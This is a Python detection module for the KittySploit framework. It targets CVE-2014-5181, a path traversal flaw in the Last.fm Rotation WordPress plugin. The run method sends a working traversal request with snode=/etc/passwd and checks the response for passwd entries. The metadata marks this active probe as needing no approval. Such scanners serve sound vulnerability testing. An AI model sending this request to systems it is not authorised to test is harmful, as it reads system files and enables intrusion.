#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Directory traversal vulnerability in lastfm-proxy."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Last.fm Rotation 1.0 - Path Traversal Detection',
        'description': 'Directory traversal vulnerability in lastfm-proxy.php in the Last.fm Rotation (lastfm-rotation) plugin 1.0 for WordPress allows remote attackers to read arbitrary files via a .. (dot dot) in the snode parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'wpscan', 'cve', 'cve2014', 'wp-cross-rss', 'wordpress', 'wp-plugin', 'lfi', 'wp', 'lastfm-rotation', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'cve': 'CVE-2014-5181',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('/wp-content/plugins/lastfm-rotation/',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/plugins/lastfm-rotation/lastfm-proxy.php?snode=/etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='medium', reason='Last.fm Rotation 1.0 - Path Traversal detected', path=path)
            return True
        return False

